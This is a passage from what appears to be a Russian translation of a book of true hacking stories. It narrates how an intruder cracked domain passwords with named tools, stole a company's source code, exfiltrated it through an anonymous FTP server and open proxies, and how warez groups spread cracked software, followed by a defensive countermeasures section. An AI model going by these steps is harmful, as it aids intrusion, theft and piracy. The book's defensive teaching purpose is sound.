е е » .  И что еще больше понравилось Роберту, «он сделал копию своего почтового ящика» со всеми адресами и контактами. «Я скопировал архив всех его файлов», — вспоминает Роберт, «а также и почтовый ящик со всеми электронными письмами, где было сто тридцать-сто сорок мегабайт».  После чего он отключился и провел несколько часов за чтением электронных писем этого парня. Он нашел там «все внутренние объявления, сведения об изменениях его заработной платы, обзоры работы — буквально все о нем. Он был одним из шести системных администраторов и отвечал за Windows-серверы», — говорит Роберт. «Из его почтового ящика я получил информацию и о других системных администраторах и об их возможностях». Он получил даже еще больше:  «Информация в его письмах была очень полезной. Я смог создать список людей, имевших доступ к кодам программы, которые были мне нужны. Я выписал их имена и все подробности, которые смог найти о них. Затем я просмотрел все файлы этого парня в поисках слова „password“ и обнаружил несколько регистраций, причем одна из них относилась к человеку из компании, занимающейся сетевыми приложениями.  Этот администратор организовал аккаунт для кого-то, работающего вне компании с адресом электронной почты и паролем. Он делал аналогичную вещь еще для двух или трех производителей оборудования. Я обнаружил ответные письма от компаний с благодарностью за организацию аккаунта. Пароль там был «mypassword»».  А вдруг они так и оставили этот пароль, не поменяв его? Люди ленивы, поэтому имело смысл попробовать.  Правильная мысль. Пароль сработал для одного из пользователей на сервере компании. Но это был не администратор домена, который, как надеялся Роберт, дал бы ему доступ к базе данных акка-унтов, в которой хранятся все имена пользователей и их зашифрованные пароли. К этой базе обращались все авторизованные пользователи всего домена. У Роберта было всего одно имя пользователя, но зато была возможность различных уровней доступа в зависимости от того, как он входил — через домен или через местный компьютер. Роберту нужны были права администратора домена, чтобы получить доступ к самым важным системам компании, но администратор использовал другой пароль для выполнения своих функций, которого у Роберта не было. «От этого я просто покрывался красными пятнами», — жалуется он.  Дело, казалось, зашло в тупик. « Н о я сообразил, что могу случайно наткнуться на этот пароль, если поищу его на других ресурсах».  И ситуация начала проясняться. Он обнаружил, что компания использовала специальное приложение для управления проектами под названием Visual SourceSafe, и добрался до внешнего файла паролей, который оказался читаемым для любого пользователя, имеющего доступ в систему. Атака этого файла паролей при помощи программы для взлома «мешанины» паролей, которая длилась «полторы-две недели, принесла мне различные пароли для этого сисадмина». Он нашел второй пароль администратора, который так старательно искал. Это была победа, поскольку пароль использовался для директории администрации домена, которая дала Роберту доступ ко всем серверам, в которые он хотел проникнуть.   К   ВОПРОСУ   О   ПАРОЛЕ   Пароль — это очень личная вещь, говорит Роберт. «Серьезные компании внимательно относятся к этому вопросу, и каждому пользователю выдают действительно очень качественный пароль. И наоборот. если в качестве пароля для пользователей выбирается название дня недели, имя компании или вообще — оставляется изначально установленный пароль, то такие компании можно назвать неразумными».  Роберт рассказывал мне, что в компании, где он работал, пароль сотрудника выбирался в день начала его работы. При входе в компьютер «у вас было всего семь попыток его набора до блокирования системы, поэтому вы могли совершить не более пяти попыток, если старались попасть в чью-то директорию».  Роберт обнаружил множество пользователей в компании, куда он пытался проникнуть, имеющих изначально установленный пароль в следующем виде:   company name-2003   Он не нашел ни одного пароля с цифрой 2002 или меньше, а это значит, что все они были изменены в Новый Год. Фантастически «мудрое» управление паролями!   ПОЛУЧЕН   ПОЛНЫЙ   ДОСТУП   Роберт чувствовал, что все ближе приближается к своей цели. Вооруженный вторым паролем администратора, чьей авторизацией он пользовался, он получил доступ к зашифрованным паролям всего домена. Он использовал программу PwDump2 для извлечения этих паролей из контроллера первичного домена и программу l0phtCrackIII для их расшифровки.  Самая последняя «фишка» в этом деле основана на использовании «радужных таблиц», которые устанавливают соответствие зашифрованных и расшифрованных паролей. На сайте  http://sarcaprj.wayreth.eu.org вам могут помочь расшифровать пароли. Вам надо запустить LAN Manager и указать адрес вашей электронной почты и послать им зашифрованные пароли. В ответ вы получите электронное письмо с расшифрованными паролями. Роберт объясняет: «У них есть огромный набор зашифрованных общеупотребительных паролей (восемнадцать-двадцать гигабайт), поэтому они на самом деле не расшифровывают ваши пароли, а сравнивают их со своей „библиотекой“. Для компьютера не составляет труда спросить несколько сотен миллионов раз: „Ты не это? Не это? Не это? Вот ты что такое, оказывается“. Радужные таблицы уменьшают время, необходимое для атаки, буквально до нескольких секунд».  Когда L0phtcrack закончил свою работу, у Роберта были пароли практически для всех пользователей этого домена. К тому времени, изучив множество электронных писем, он создал список людей, которые обменивались письмами с администратором. Один из них писал о сломанном сервере, жалуясь: «Я не смог спасти последнюю версию написанной программы». Значит, это был разработчик, обладающий ценной информацией. Роберт отыскивал его имя и пароль.  Затем он обращался к системе через dial-up и вводил данные того самого разработчика. «Войдя под его именем, я получал полный доступ ко всему».  «Все» в данном конкретном случае означало коды программного продукта, «те самые ключи от замка». И он получил их. «Я хотел украсть коды программы. Теперь у меня было все, что я хотел», — вспоминает он, абсолютно счастливый.   КОДЫ   ПОСЛАНЫ   ДОМОЙ   Роберт увидел блеск золота, которое он так долго искал. Дело было за малым: предстояло безопасным путем переправить его к себе домой. «Это была совсем не простая работа», — говорит он, — «Все дерево файлов „весило“ не меньше гигабайта, чтобы перетащить его к себе, мне предстояло валандаться с ними не одну неделю».  (Все же это было не так тяжело, как пытаться перегрузить к себе огромный сжатый файл через модем со скоростью передачи 14,4 Кб/с, что я делал, когда копировал сотни мегабайт кодов VMS из корпорации DEC несколькими годами раньше).  Поскольку ему предстояло переслать огромный объем данных, он стал думать о более скоростном соединении для такой пересылки. Кроме того, он хотел отыскать такой путь передачи, по которому его не удастся просто выследить. В качестве первого соединения он выбрал одну из компаний в США, в которую уже проникал раньше, она использовала Citrix MetaFrame.  Роберт установил VPN-соединение с компанией-мишенью и вычислил диск, на котором были расположены коды программы. Он просто скопировал их. «Я встроил этот Citrix-сервер в VPN, а затем переправил всю информацию из общедоступной директории — коды программы и все сопутствующие файлы на Citrix-сервер».  Чтобы отыскать путь для безопасной передачи файлов, так чтобы их нельзя было отследить (как он надеялся), он использовал мою любимую поисковую машину Google, чтобы отыскать анонимный FTP-сервер, который позволял бы кому угодно загружать и выгружать файлы в общедоступную директорию. Более того, он искал анонимный FTP-сервер, который имел бы директории, доступные через HTTP (то есть, через Интернет-браузер). Он полагал, что при работе через такой FTP-сервер он буквально «утонул» бы в Интернет-шуме. поскольку множество других пользователей используют этот сервер для перекачивания порнографических материалов, музыки и кинофильмов.  Вот что он искал в Google:   index of parent incoming inurl:ftp   Такой поиск FTP-серверов ориентирован на анонимный доступ. Изо всех серверов, которые выдал в ответ на его запрос Google, он выбрал один, который удовлетворял его критериям для перегрузки из H T T P , как мы уже отмечали, чтобы перегрузить все коды из своего Интернет-браузера.  После того, как файлы с текстами программы были переданы из компании на Citrix-сервер, он далее переслал их на анонимный FTP-сервер, найденный при помощи Google.  Оставался последний шаг перед тем, как он, наконец, мог получить долгожданные коды программы в свои руки: передача их с FTP-сервера на его собственный компьютер. Но «в конце этого тяжелого дня я совершенно не хотел, чтобы мой Интернет-адрес был занят перегрузкой файлов в течение долгих часов — вы понимаете, что я имею в виду». Поэтому после передачи файлов на FTP-сервер он сжал их в файлы меньшего размера (на компьютерном жаргоне — «зазипо-вал»), давая им при этом произвольные имена («gift.zip» и нечто подобное).  Еще раз он использовал целую цепь открытых прокси-серверов для того, чтобы надежно спрятать свое соединение и сделать отслеживание практически невозможным. Роберт поясняет: «В одном только Тайване есть около сотни открытых прокси-серверов. В любой момент сотни людей могут использовать эти сервера». Даже если и придется анализировать записи об активности на этих серверах, то они будут просто огромными, и очень маловероятно, что ребята в полицейских формах смогут отыскать вас, чтобы постучаться потом в вашу дверь. «Ситуация как с иголкой в стоге сена. Можно, конечно, ее найти, но — очень трудно».  После соблюдения всех предосторожностей передача файлов началась.  «Я проста не мог поверить в то, что коды наконец дошли до меня. Это было просто прекрасно».   РАСПРЕДЕЛЕНИЕ  :   МИР   КРАКЕРОВ   Что же делают такие хакеры, как Эрик и Роберт после того, как получают в свои руки вожделенное ПО? Для них обоих, так же как и для всех других, к кому можно применить термин «кракер» или «программный пират», ответ заключается в том, что большинство из них разделяют полученные программы со своими многочисленными коллегами. Но делают они это не напрямую.  Эрик объяснял нам последовательность действий, которую он предпринял, добыв, наконец, программы, за которыми он охотился два года. Это приложение было написано на языке программирования, в котором Эрик не был экспертом, но у него был друг, который программировал именно на этом языке, поэтому он переслал текст программы ему вместе с генератором ключей для нее — то есть специальной программы, которая генерирует коды для обхода лицензированных проверок безопасности. Тот скомпилировал обе программы.  «Я п е р е д а л э т у скомпилированную версию кому-то еще, кто перегрузил ее на один сайтов Warez, заархивировал ее, приложив программу для генерации ключей и снабдив информационным файлом с необходимыми инструкциями, как устанавливать и взламывать программу. Я никогда не рассылал ее самостоятельно».  Перед тем, как загружать куда-то программу и генератор ключей, они проверял, не взламывает ли кто-то ту же самую программу. «Перед тем, как посылать куда-то программу, обязательно надо проверить, что никто другой не с д е л а л этого до вас, то е с т ь с д е л а т ь „проверку на дурака“ и убедиться, что вы обладатель уникального продукта».  «Проверка на дурака» (dupecheck) — это очень просто. Кракер отправляется на сайт  http://www.dupecheck.ru  (сайт расположен в России) и сообщает название и версию продукта. Если она присутствует в списке, это значит, что кто-то уже взломал ее и отослал на один из Warez-сайтов.  Однако то, что программа послана на этот сайт, не означает, что каждый может загрузить ее себе. Вы можете получить такой ответ —  мы  —  закрытая   группа  ,   поэтому  —  отвалите   С другой стороны, если в списке нет запрошенного продукта, это означает, что кракер одержал серьезную победу: он первым получил возможность распространять взломанную версию этой программы.  После того, как программа загружена на сайт, ее распространение идет стремительно, как описывает Эрик.  «В мире есть около пятидесяти Warez-сайтов — это частные FTP-сайты.  Вы загружаете программу на один из таких сайтов и в течение часа онакопируется с него на тысячи других сайтов по всему миру при помощи «курьеров».  От пятидесяти до двухсот программ ежедневно, за среднее вполне можно в з я т ь ц и ф р у сто. Т а к вот, сотня программ в день распространяется таким образом».  Как объяснил Эрик, «курьер» — это человек, который переносит «объект» с одного кракерского сайта на другой. Курьеры — это «следующее звено в цепочке» после ребят, которые взламывают программы.  «Курьеры следят за тремя или четырьмя различными сайтами. Как только кто-то загружает (взломанную программу) на Warez-сайт, и они замечают, что это что-то новенькое, они сгружают ее себе и посылают на три-четыре других сайта как можно быстрее, чтобы успеть первыми. А в это время, может быть, только двадцать сайтов имеют эту программу. В с е происходит за два-три м е с я ц а до того, как э т а новая программа появляется в магазинах».  После курьеров приходит черед других участников процесса — ребят, у которых нет доступа к центральным Warez-сайтам — они тоже замечают новую программу и повторяют процесс ее загрузки и последующего распространения так быстро, как только могут, на максимальное число сайтов, чтобы быть первыми. «И в течение часа программа буквально несколько раз облетает вокруг Земли».  Некоторые люди получают доступ к Warez-сайтам «за кредиты», как объяснял Эрик. «Кредиты» — это разновидность валюты у краке-ров, которую они зарабатывают, выполняя задания сайтов, заключающиеся в распространении взломанных программ. Обычно кракеры распространяют не только программы, но и сопутствующие им лицензированные ключи или другие необходимые продукты.  Кракеры зарабатывают «кредиты», если они становятся первыми, кто загрузит взломанную программу на сайт, где ее еще нет. Только первый, загрузивший новое приложение на определенный сайт, получает «кредит».  «Именно поэтому у них е с т ь стимул делать в с е т а к быстро, как э т о только возможно. П о э т о м у программа и р а с п р о с т р а н я е т с я с невероятной скоростью. В считанные мгновения люди по в с е м у миру копируют ее на свои собственные кракерские с а й т ы или доски объявлений.  Люди вроде меня, которые занимаются взломом программ, имеют неограниченный доступ к подобным новинкам. Им выгодно поддерживать хорошие отношения с кракерами, поскольку вы будете именно им поставлять следующие свои взломанные программы, если будете первым, кому они рассылают новинки».  На некоторых сайтах размещаются программы и генераторы ключей. « Н о многие кракерские сайты», — объясняет Эрик, — «размещают у себя не программу, а только генератор ключей. Делается это для того, чтобы сделать сайт более компактным и уменьшить вероятность того, что полиция прикроет сайт».  На все упомянутые сайты, а не только на основные Warez-сайты, проникнуть достаточно сложно. Они все секретные, поскольку, как только один из адресов сайта становится известен, «полиция закрывает не только этот адрес, а сам сайт, арестовывает людей, с ним связанных, забирает все их компьютеры и арестовывает даже тех, кто хоть раз бывал на этом сайте», поскольку на самом деле все эти FTP-сайты представляют собой огромные склады краденного.  «Я даже больше не хожу на такие сайты. Я и раньше редко ходил, как раз из-за риска, связанного с подобными посещениями. Я решаюсь на это, только когда мне позарез необходимы какие-то программы, но я никогда не перегружаю их себе самостоятельно.  В с я э т а система достаточно интересна, поскольку она очень эффективна в работе. Я хочу сказать, что вряд ли какой-то иной бизнес обладает такой системой распределения, в которой каждый участник кровно заинтересован.  В качестве кракера, я получал приглашения посетить все эти сайты, поскольку им необходимы хорошие кракеры, так как они будут привлекать все больше курьеров. А курьерам нужен доступ к хорошим сайтам, поскольку там они получают качественные новые продукты. Моя группа не позволяла новым людям проникать к себе. И мы не выпускали некоторых вещей. Однажды летом мы выпустили Microsoft Office и это было очень рискованно. После этого мы решили не связываться с известными программами типа этой.  Некоторые ребята слишком увлекаются этим и становятся агрессивными, особенно когда начинают торговать компакт-дисками ради денег —это привлекает внимание. Именно они первыми попадаются. Все то, что мы рассказали о программах, происходит и с музыкой и с кинофильмами. На некоторых специальных сайтах для любителей кино вы можете познакомиться с фильмами за две-три недели до их премьеры в кинотеатрах. Там всегда есть кто-то, кто работает распространителем или изготовителем копий. Всегда кто-то бывает заинтересован в поддержке процесса».   АНАЛИЗ   Вот какой урок стоит извлечь из этой истории о поиске Эриком последней серверной программы для завершения его коллекции: в природе нет совершенства. Это утверждение становится еще более верным, если в дело замешаны люди. Компания, выбранная им в качестве мишени,  очень серьезно относилась к проблеме безопасности и отлично защитила свою компьютерную систему. И все же опытного хакера с серьезной мотивацией, готового потратить достаточно времени на атаку, практически невозможно остановить.  Скорее всего, вам повезет и никто из таких экспертов, как Эрик или Роберт не будет атаковать вашу систему, вкладывая в это занятие все свое мастерство и кучу времени. А что вы скажете о нечистоплотном конкуренте, который наймет целую группу хакеров, искренне любящих свою работу, которые будут проникать к вам (так и хочется сказать, как тараканы) по 12-14 часов в день?  А если атакующие найдут брешь в электронной обороне вашей компании, что тогда? По мнению Эрика: «Когда кто-то проник в вашу сеть так глубоко, как я проник в эту сеть, вы никогда и ни за что не выгоните его. Он останется там навсегда». Он считает, что избавление от такого незваного гостя потребует колоссальной перетряски всей системы, изменения каждого пароля в один день и час, переустановки всех систем одновременно и установки систем безопасности одновременно, чтобы закрыть систему. «Оставьте хоть одну дверь слегка приоткрытой, и я вернусь к вам снова».  Мой опыт подтверждает этот вывод. Когда я учился в высшей школе, я проник в DEC (Digital Equipment Corporation Easynet). Они знали, что к ним проник хакер, но в течение восьми лет их лучшие специалисты по безопасности не могли «выкурить» меня оттуда. Они, в конце концов, освободились от меня — причем совсем не благодаря своим усилиям, а потому, что правительство отправило меня на вынужденные каникулы в одно из своих специальных заведений.   КОНТРМЕРЫ   Хотя мы рассказали о различных атаках, вы должны были понять. как много одинаковых лазеек открывают хакерам путь к успеху, а значит, и для противодействия им есть общие контрмеры.  Вот главные выводы из рассказанных историй.   КОРПОРАТИВНЫЕ   МЕЖСЕТЕВЫЕ   ЭКРАНЫ   Межетевые экраны должны быть сконфигурированы так, чтобы разрешать доступ только к необходимым услугам, как того требует бизнес. Надо провести тщательную проверку, чтобы убедиться, что ни к каким услугам нет доступа, кроме как по бизнес-необходимости. Вдобавок стоит использовать «межсетевой экран с проверкой состояния». (Этот тип межсетевого экрана обеспечивает более высокий уровень безопасности, отслеживая перемещение всех пакетов за определенный период времени. Входящие пакеты пропускаются только в ответ на исходящее соединение. Другими словами, межсетевой экран открывает свои ворота только для определенных портов на основе исходящего трафика). Кроме того, имеет смысл установить набор правил для управления исходящими сетевыми соединениями. Системный администратор должен периодически проверять конфигурацию межсетевого экрана и все записи о его активности, чтобы убедиться, что никто не сделал в нем неавторизованных изменений. Если хакер взламывает межсетевой экран, то он, скорее всего, сделает в нем незначительные перемены для своей выгоды.  Имеет смысл организовать и управление доступом к VPN на основе IP-адреса пользователя. Это применимо там, где лишь ограниченное число пользователей может соединяться с корпоративной сетью через VPN. В дополнение к этому можно ввести более безопасную форму VPN-авторизации, такую, как смарт-карты или специальные сертификаты вместо каких-то локальных секретов.   ЛИЧНЫЕ   МЕЖСЕТЕВЫЕ   ЭКРАНЫ   Эрик проник в компьютер СЕО и обнаружил, что там работает персональный межсетевой экран. Его это не остановило, поскольку он использовал сервис, который был разрешен межсетевым экраном. Он смог посылать нужные ему команды через процедуру, работающую по умолчанию в Microsoft SQL-сервере. Это еще один пример использования сервиса, от которого межсетевой экран не защищает. Жертва в таком случае никогда и не подумает проверять огромные записи (logs) об активности межсетевого экрана, которые содержат более 500 Кбайт. И это не исключение. Многие организации внедряют специальные технологии для обнаружения и предотвращения вторжения, после чего думают, что технологии будут сами собой управлять. Как было показано, такое неразумное поведение позволяет атаке продолжаться без помех.  Урок ясен: необходимо очень тщательно определить правила работы межсетевого экрана, чтобы не только фильтровать, как входящий, так и исходящий трафики для услуг, которые не являются необходимыми для ведения бизнеса, но и периодически проверять соблюдение этих правил и записей о работе экрана, чтобы обнаружить неавторизованные изменения или попытки взлома системы безопасности.  После того, как хакер проник в систему, он, скорее всего, отыщет «спящую» или неиспользуемую систему и проникнет в них, чтобы иметь возможность вернуться сюда в недалеком будущем. Другая тактика состоит в том, чтобы добавить групповые привилегии существующим аккаунтам, которые уже были взломаны, Периодические проверки всех директорий пользователей, групп и разрешений доступа к файлам — это единственный способ выявить возможное вторжение или неавторизованную активность собственных сотрудников. Есть целый ряд коммерческих и общедоступных средств для контроля безопасности, которые автоматизируют этот процесс. Поскольку хакеры прекрасно осведомлены о них, очень важно периодически проверять целостность и этих средств, текстов и любых данных, которые используются вместе с ними.  Многие вторжения являются прямым результатом неправильной конфигурации системы, например, лишних открытых портов, слабой системы защиты доступа к файлам и неправильно сконфигурированным Интернет-серверам. После того, как хакер проник в систему на уровне пользователя, его следующим шагом становится повышение своих привилегий через использование неизвестных или незакрытых лазеек и плохо сконфигурированных разрешений. Не забывайте, что многие атакующие совершают целый ряд осторожных шагов на пути к полному проникновению в систему.  Администратор базы данных, которая поддерживает Microsoft SQL-сервер, должен рассматривать возможность отключения определенных команд (таких как x pcmdshell , x pmakewebtask и xp regread), которые могут быть использованы для получения дальнейшего доступа к системе.   СКАНИРОВАНИЕ   ПОРТОВ   В то время, как вы читаете эти строки, вполне возможно, что ваш соединенный с Интернетом компьютер сканируется другим компьютером в поисках «низко висящего яблока». Подобное сканирование портов вполне законно в США (и большинстве других стран), неприязнь к хакерам имеет свои ограничения. Самое важное — отличить серьезную атаку от тысяч любительских попыток «пробить» список адресов вашей компании.  Есть несколько продуктов, включая межсетевые экраны и системы обнаружения вторжения, которые определяют заранее оговоренные типы сканирования портов и могут сигнализировать нужным людям о неавторизованной активности. Вы можете настроить большинство межсетевых экранов так, чтобы выявлять сканирование портов и душить подобные соединения. В некоторых коммерческих межсетевых экранах есть возможность предотвратить быстрое сканирование портов. Есть и средства с открытым кодом, которые могут выявлять сканирование портов и отбрасывать пакеты в течение определенного периода времени.   ЗНАЙТЕ   СВОЮ   СИСТЕМУ   Есть целый ряд правил по управлению системой, которые вы должны выполнять: • проверять список процессов на наличие необычных и неизвестных процессов;  • проверять список программ на неавторизованные добавления или изменения;  • проверять всю файловую систему в поисках новых или модифицированных файлов, текстов или приложений;  • обращать внимание на необычное уменьшение свободного пространства на диске;  • постоянно убеждаться в том, что все системы и пользователи работают и убирать «спящие» или неизвестные директории;  • проверять, что все специальные аккаунты сконфигурированы так, чтобы не допускать интерактивного входа в них со стороны сети;  • проверять, что все директории системы и файлы имеют соответствующие разрешения на допуск к файлам;  • проверять все записи об активности системы на предмет наличия в них необычной активности (например, удаленного доступа неизвестного происхождения или в необычное время, то есть, в нерабочие часы или в выходные дни);  • проверять все записи об активности Интернет-сервера, чтобы идентифицировать все запросы неавторизованного доступа к файлам; атакующие, как продемонстрировано в этой главе, будут копировать файлы в директорию Интернет-сервера, и перегружать файлы через Интернет (HTTP);  • постоянно убеждаться в том, что на Интернет-сервере, FrontPage или WebDav установлены соответствующие разрешения для предотвращения неавторизованного проникновения с файлов доступа.   РЕАКЦИЯ   НА   ВТОРЖЕНИЕ   ИЛИ   ПОДАЧА   СИГНАЛА   ТРЕВОГИ   Своевременное осознание того, что произошел прорыв в систему, может помочь предотвратить существенные потери. Надо осуществлять постоянный аудит операционной системы, чтобы идентифицировать возможные прорехи в системе безопасности. Выработайте способ подачи автоматического сигнала тревоги сетевому администратору, когда происходит какое-то необычное событие. При этом имейте в виду, что если атакующий уже получил высокие привилегии и осведомлен о контроле, он может отключить эту систему подачи сигнала тревоги.   ВЫЯВЛЕНИЕ   НЕАВТОРИЗОВАННЫХ   ИЗМЕНЕНИЙ В   ПРИЛОЖЕНИЯХ   Роберт мог заменить приложение helpdesk.exe, используя неправильную конфигурацию FrontPage. После того, как он достиг своей цели, и получил коды главного продукта компании, он оставил «взломанную» версию приложения helpdesk, чтобы иметь возможность вернуться сюда через какое-то время. Загруженный сетевой администратор может так никогда и не понять, что хакер скрытно изменил существующую программу, особенно, если он не делает никаких проверок на целостность системы. В качестве альтернативы ручным проверкам можно посоветовать лицензированную программу tripware, которая автоматизирует процесс выявления неавторизованных изменений.   РАЗРЕШЕНИЯ   Эрик смог получать конфиденциальные пароли базы данных, просматривая файлы в директории «/include». Без этих паролей выполнение его миссии было бы очень затруднено. Получение паролей к важной базе данных в файлах, которые может читать кто угодно, — это все, что ему было нужно для проникновения. Очень важно для обеспечения безопасности избегать хранения незашифрованных паролей в файлах программ или других текстах. Должно быть принято строгое корпоративное правило, запрещающее хранение зашифрованных паролей без крайней необходимости. Во всяком случае, файлы, содержащие незашифрованные пароли, должны быть тщательно защищены, чтобы предотвратить проникновение в них.  В компании, которую атаковал Роберт, сервер Microsoft IIS4 не был сконфигурирован так, чтобы не позволять гостям читать и записывать файлы в директорию Интернет-сервера. Внешний файл паролей, используемый в сочетании с Microsoft Visual SourceSafe, может прочесть любой пользователь, который вошел в систему. Из-за этих неправильных конфигураций хакер может получить полный контроль над атакуемым доменом Windows. Развертывание систем с организованной структурой директорий для приложений и баз данных повышает эффективность управления доступом.   ПАРОЛИ   В дополнение ко всем уже перечисленным в этой книге предложениям по управлению паролями, описанный в этой главе успех атакующих выявляет некоторые важные дополнительные меры. Эрик рассказывал, что он смог понять принцип конструкции паролей в компании на базе анализа тех паролей, которые он смог взломать. Если ваша компания использует для создания паролей какие-то стандартные, предсказуемые методы, то это становится еще одной возможностью для хакеров проникнуть в вашу систему.  После того, как атакующий получает привилегированный доступ в систему, его главной задачей становится получение паролей других пользователей или баз данных. Тактика поиска их в электронных письмах или среди файлов является очень распространенной.  Компания, которая использует операционные системы Windows, должна конфигурировать их так, чтобы зашифрованные пароли для LAN Manager не хранились в регистре. Если атакующий получит привилегии администратора, то он сможет получить в свои руки все зашифрованные пароли, а затем — взломать их. Персонал ИТ-де-партамента может легко сконфигурировать систему так, что эти пароли не будут сохраняться, что существенно усложнит хакеру процесс взлома паролей. Однако, после получения доступа к системе, атакующий может «прослушать» весь ваш сетевой трафик или установить добавление паролей извне, чтобы узнать пароли пользователей.  В качестве альтернативы отключению паролей LAN Manager можно сконструировать пароли из символов, которых нет на клавиатуре с помощью ключа <alt>и численного обозначения символа, как это описано в Главе 6. Широко используемые программы для взлома паролей даже не пробуют взламывать пароли, где есть символы из греческого, еврейского, латинского и арабского алфавитов.   ПРИЛОЖЕНИЯ   ДРУГИХ   КОМПАНИЙ   Используя обычное приложение для сканирования сети, Эрик обнаружил незащищенный архивный файл записей, созданный коммерческим FTP-приложением. Этот файл содержал полную информацию о тех файлах, которые передавались из системы или в систему. Не полагайтесь на изначальную конфигурацию тех приложений других компаний, которые вы устанавливаете у себя. Старайтесь устанавливать ту конфигурацию, которая минимизирует утечку информации (такой, как log-записи), которую можно использовать для проведения атаки на сеть.   ЗАЩИТА   ОБЩЕДОСТУПНЫХ   ФАЙЛОВ   Общедоступные сетевые файлы — это обычная методика организации общего доступа к файлам и директориям в корпоративной сети. ИТ-персонал может принять решения не вводить паролей или контроля доступа к подобным файлам, поскольку добраться до них можно только из внутренней сети. Как уже не раз отмечалось в этой книге, компании стремятся, прежде всего, обеспечить сохранность периметра и гораздо меньше думают о защите сети от проникновения изнутри. Как это было в случае Роберта, атакующие, проникшие в сеть, будут искать общедоступные сетевые файлы с именами, которые указывают на ценную информацию. «Описательные» имена типа «research» или «backup» существенно упрощают задачу атакующего. Самая лучшая защита в этом случае — это специальная защита всех общедоступных сетевых файлов, содержащих ценную информацию.   ПРЕДОТВРАЩЕНИЕ   РАСКРЫТИЯ   DNS   Роберт использовал программу для отгадывания DNS, чтобы определить имена узлов в зоне публичного доступа домена. Предотвратить раскрытие этих имен можно с помощью хорошо известного метода горизонтального расщепления DNS, что относится, как к внешнему, так и внутреннему серверу имен. Только общедоступные узлы перечислены в файловой зоне внешнего сервера имен. Внутренний сервер имен гораздо лучше защищен от атак, он должен отличать внутренние DNS-запросы для корпоративной сети.   ЗАЩИТА   MICROSOFT   SQL  -СЕРВЕРА   Эрик обнаружил, что резервный сервер электронной почты и Интернет-сервер используют Microsoft SQL-сервер, на котором имя пользователя и пароль записаны так же, как и в файлах директории «include». SQL-сервер не должен подключаться к Интернету без серьезной бизнес-необходимости. Даже если аккаунт «SA» был переименован, атакующий может идентифицировать новое имя аккаунта и пароль в незащищенном файле кодов. Оптимальным решением для этого будет блокирование порта 1433 (Microsoft SQL Server) до тех пор, пока он действительно не понадобится.   ЗАЩИТА   ВАЖНОЙ   ИНФОРМАЦИИ   Описанные в этой главе атаки оканчиваются успехом, потому что коды программ хранятся на серверах, которые не защищены так, как это должно быть сделано. Для такой важнейшей информации, как результаты групповых исследовательских разработок, должны применяться специальные методы безопасности на основе технологий шифрования.  Для одиночного разработчика (в отличие от группы разработчиков, где целый ряд людей должен иметь доступ к разрабатываемому коду) наиболее приемлемо шифрование самой ценной информации, такой как коды программы, при помощи программ PGP Disk или PGP Corporate Disk. Эти программы создают виртуальные зашифрованные диски и функционируют понятным для пользователя образом.   ЗАЩИТА   АРХИВИРОВАННЫХ   ФАЙЛОВ   Как стало ясно из рассказанных историй, сотрудники — даже те из них, кто серьезно думает о безопасности — часто упускают из виду необходимость обеспечения безопасности архивов, включая архивы электронной почты, от доступа посторонних людей. В процессе моей хакерской карьеры я не раз замечал, что многие системные администраторы оставляют сжатые архивы или директории важной информации незащищенными. Работая в ИТ-департаменте крупной больницы, я видел, что все защищенные базы данных архивируются обычным образом и хранятся потом безо всякой з а щ и т ы так, что любой сотрудник может получить к ним доступ.  Роберт использовал еще один аспект этого распространенного упущения, когда он обнаружил копии кодов программы коммерческого приложения в директории общего доступа на Интернет-сервере.   ЗАЩИТА   ОТ   АТАК   MS   S  QL I  N  JEC  T  I  ON   Роберт сознательно удалил все проверки входных команд из Интернет-приложений, которые должны были предотвращать атаки SQL-injection. Следующие шаги могут защитить вашу компанию от атаки, которую использовал Роберт:  • никогда не запускайте сервер Microsoft SQL в контексте работы системы — старайтесь запускать его иным способом;  • разрабатывая программы, создавайте коды так, чтобы не генерировать динамические SQL-запросы;  • используйте процедуры хранения, чтобы выполнять SQL-запро-сы, создайте аккаунт только для выполнения таких сохраненных процедур и определите систему защиты от проникновения в этот аккаунт.   ИСПОЛЬЗОВАНИЕ   С  Е  Р  В  И  С  О  В   MICROSOFT   VPN   В качестве средства авторизации Microsoft V P N применяет авторизацию Windows, что позволяет атакующему использовать недостаточно защищенные пароли для проникновения в VPN. В некоторых ситуациях можно потребовать для доступа к V P N авторизации при помощи смарт-карт. Иногда имеет смысл контролировать доступ к V P N при помощи проверки IP-адресов клиентов.  В атаке Роберта системный администратор должен был контролировать VPN-сервер на появление новых пользователей в группе VPN. Другие меры тоже очевидны, это: удаление «спящих» аккаунтов из системы (как уже не раз было отмечено), гарантированное удаление всех уволенных сотрудников, и ограничение времени доступа рабочими днями и рабочими часами.   УДАЛЕНИЕ   УСТАНОВОЧНЫХ   ФАЙЛОВ   Роберт смог получить список рассылки, который был ему интересен, не проникая в приложение для рассылки, а используя лазейку в изначальной установке приложения. После того, как приложение успешно установлено, установочные тексты должны быть удалены.   ПЕРЕИМЕНОВАНИЕ   АККАУНТА   АДМИНИСТРАТОРА   Любой человек, у кого есть доступ к Интернету, может запросить Google на предмет «листа паролей», чтобы найти сайты, где перечислены все начальные пароли, которые производители устанавливают на свои устройства. Именно поэтому надо по мере возможности переименовывать директории администратора и внешнего пользователя. Однако это не имеет смысла, когда имя аккаунта и пароль сохраняются где-нибудь в открытой форме, как это было в случае с атакой Эрика.   УЖЕСТОЧЕНИЕ   УСТАНОВОК   WINDOWS  ,   ЧТОБЫ   ПРЕДОТВРАТИТЬ   СОХРАНЕНИЕ   ОПРЕДЕЛЕННЫХ   ДАННЫХ   Изначально установленная конфигурация Windows автоматически перемешивает «нарезку» паролей и сохраняет в виде текста те пароли, которые используются для входа в сеть через diap-up. После получения достаточных привилегий атакующий будет пытаться извлечь максимум информации, включая любые пароли, которые хранятся в регистре или других областях системы.  Сотрудник, пользующийся доверием своих коллег, может в принципе проникнуть в любое место домена, приложив минимальные усилия социальной инженерии, если его рабочая станция запоминает пароли. Один рассерженный сотрудник призвал к себе службу технической поддержки, жалуясь, что не может войти в свою рабочую станцию. Он потребовал от техников немедленно прийти к нему на помощь. Техник пришел, вошел в систему, используя свои привилегии. и устранил «проблему». Вскоре после этого упомянутый сотрудник извлек из директории техника все зашифрованные пароли и взломал их, получив такие же права в доступе к домену, как имел техник.  Такие программы, как Internet Explorer и Outlook хранят пароли в регистре. Чтобы узнать больше об отключении этих возможностей, используйте поиск Google по словам «disable password caching».   ГЛУБОКАЯ   ЗАЩИТА   Истории, рассказанные в этой главе, показывают, может быть даже более наглядно, чем все остальные в этой книге, что защита компании по периметру — явно недостаточная мера. В современной ситуации периметр часто открывается, поскольку бизнес-цели предусматривают доступ пользователей в 